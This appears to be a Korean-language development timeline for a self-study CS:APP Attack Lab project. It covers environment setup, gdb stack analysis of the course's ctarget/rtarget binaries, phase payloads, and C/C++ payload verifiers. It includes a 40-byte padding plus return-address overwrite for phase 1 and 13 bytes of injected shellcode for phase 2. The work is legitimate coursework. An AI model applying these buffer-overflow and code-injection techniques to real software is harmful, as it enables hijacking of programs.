# Attack Lab — 개발 타임라인

## 이 문서의 목적

소스코드만으로는 추적할 수 없는 개발 과정의 전체 흐름을 기록한다. 공식 타겟 분석, 페이로드 설계, companion 검증기 구현의 순서, 사용한 CLI, 도구, 결정의 맥락을 포함한다.

---

## Phase 0: 환경 준비

### 작업 환경

- **OS**: macOS (Apple Silicon)
- **Docker**: Docker Desktop for Mac (ARM64), `--platform linux/amd64`
- **공유 인프라**: Data Lab/Bomb Lab에서 빌드한 Docker 이미지 재사용 (`csapp-official-linux-amd64`)

### 디렉토리 구조 생성

```
attacklab/
  README.md
  problem/           ← 공식 계약, 페이로드 파일, Makefile
  c/                 ← C companion 검증기
  cpp/               ← C++ companion 검증기
  docs/              ← 공개용 공격 모델/정책 설명
  notion/            ← 비공개 프로세스 노트
```

### 공식 타겟 복원

```bash
cd problem
make restore-official
```

`restore_csapp_self_study_assets.py`가 `csapp.cs.cmu.edu`에서 `target1.tar`를 다운로드, `problem/official/target1/` 아래에 풀어놓는다. 포함 파일: `ctarget`, `rtarget`, `hex2raw`, `cookie.txt`, `farm.c`.

---

## Phase 1: 공식 타겟 분석

### 디스어셈블리 및 분석 파일 생성

```bash
cd problem
make disas-ct     # ctarget → ctarget_disas.txt
make disas-rt     # rtarget → rtarget_disas.txt
make farm         # gadget farm 영역 → farm_gadgets.txt
```

### gdb를 이용한 스택 분석

```bash
docker run --rm -it --platform linux/amd64 \
  -v "$(pwd)/official/target1:/work" \
  -w /work csapp-official-linux-amd64 \
  gdb ./ctarget
```

gdb 세션에서 확인한 핵심 정보:
- `getbuf`의 버퍼 크기: 40바이트 (`sub $0x28, %rsp`)
- 버퍼 시작 주소: `0x5561dc78` (gdb에서 `print $rsp` 확인)
- `touch1` 주소: `0x4017c0`
- `touch2` 주소: `0x4017ec`
- `touch3` 주소: `0x4018fa`
- cookie 값: `0x1a2b3c4d` (cookie.txt에서 확인)

---

## Phase 2: 페이로드 설계 및 공식 검증

### Phase 1 페이로드 작성

```bash
# problem/data/phase1.txt
# 40 bytes padding + touch1 address (little-endian)
00 00 00 00 00 00 00 00 ...  (5줄 × 8 bytes)
c0 17 40 00 00 00 00 00
```

```bash
cd problem
make phase1
# 출력: PASS
```

### Phase 2 페이로드 작성

셸코드 어셈블리:
```asm
mov $0x1a2b3c4d, %rdi    # 48 c7 c7 4d 3c 2b 1a
pushq $0x4017ec           # 68 ec 17 40 00
ret                       # c3
```

기계어: `48 c7 c7 4d 3c 2b 1a 68 ec 17 40 00 c3` (13 bytes)

```bash
cd problem
make phase2
# 출력: PASS
```

### Phase 3~5 페이로드 순차 작성 및 검증

```bash
cd problem
make phase3 && make phase4 && make phase5
# 각각 PASS
```

### 전체 공식 검증

```bash
cd problem
make verify-official
# 5개 페이즈 모두 PASS
```

---

## Phase 3: C companion 검증기 구현

### 구조 설계

- `c/include/mini_attacklab.h`: 5개 페이즈 검증 함수 + hex 파서 시그니처
- `c/src/mini_attacklab.c`: 페이로드 구조 검증 로직
  - 각 페이즈의 바이트 레이아웃 불변량 정의
  - `parse_hex_string()`: hex 텍스트 파싱 (공백, 주석 처리)
  - `load_hex_file()`: 파일에서 hex 페이로드 로드
- `c/src/main.c`: CLI 드라이버 (페이즈 번호 + hex 파일)

### 페이로드 데이터 파일 작성

`c/data/phase1.txt` ~ `c/data/phase5.txt`에 각 페이즈의 검증용 hex 페이로드 작성.

### 빌드 및 테스트

```bash
cd c
make clean && make test
# 출력: C mini-attacklab tests passed
```

---

## Phase 4: C++ companion 검증기 구현

동일한 구조를 C++로 작성. `cpp/src/mini_attacklab.cpp`, `cpp/tests/test_mini_attacklab.cpp`.

```bash
cd cpp
make clean && make test
# 출력: C++ mini-attacklab tests passed
```

---

## Phase 5: 문서화

### docs/ 작성

- `docs/concepts/payload-models.md` — 5개 페이즈 패밀리와 바이트 수준 불변량
- `docs/concepts/rop-and-relative-addressing.md` — 코드 인젝션 vs ROP 비교
- `docs/references/publication-policy.md` — 공개 범위 정의
- `docs/references/verification.md` — 검증 명령어와 결과

### notion/ 작성

- `notion/00-problem-framing.md` — 과제 정의와 학습 목표
- `notion/01-approach-log.md` — 페이즈별 풀이 접근
- `notion/02-debug-log.md` — 디버깅 과정과 교훈
- `notion/03-retrospective.md` — 회고
- `notion/04-knowledge-index.md` — 핵심 개념 인덱스
- `notion/05-development-timeline.md` — 이 문서

---

## 최종 검증 상태

| 검증 항목 | 결과 | 명령어 |
|---|---|---|
| 공식 Phase 1 (ctarget) | PASS | `make phase1` |
| 공식 Phase 2 (ctarget) | PASS | `make phase2` |
| 공식 Phase 3 (ctarget) | PASS | `make phase3` |
| 공식 Phase 4 (rtarget) | PASS | `make phase4` |
| 공식 Phase 5 (rtarget) | PASS | `make phase5` |
| C companion 테스트 | PASS | `cd c && make test` |
| C++ companion 테스트 | PASS | `cd cpp && make test` |

---

## 사용된 도구 및 의존성 총정리

| 도구 | 용도 |
|---|---|
| macOS (Apple Silicon) | 개발 호스트 |
| Docker Desktop (ARM64) | 공식 타겟 실행 (linux/amd64 에뮬레이션) |
| debian:bookworm-slim | Docker 이미지 베이스 |
| gdb | 스택 분석, 레지스터 확인 |
| objdump | 디스어셈블리, gadget farm 분석 |
| hex2raw | hex → binary 변환 (공식 핸드아웃) |
| gcc / g++ | companion 검증기 빌드 |
| Python 3 | 핸드아웃 복원 스크립트 |
| GNU Make | 빌드 자동화 |
| Git | 버전 관리 |
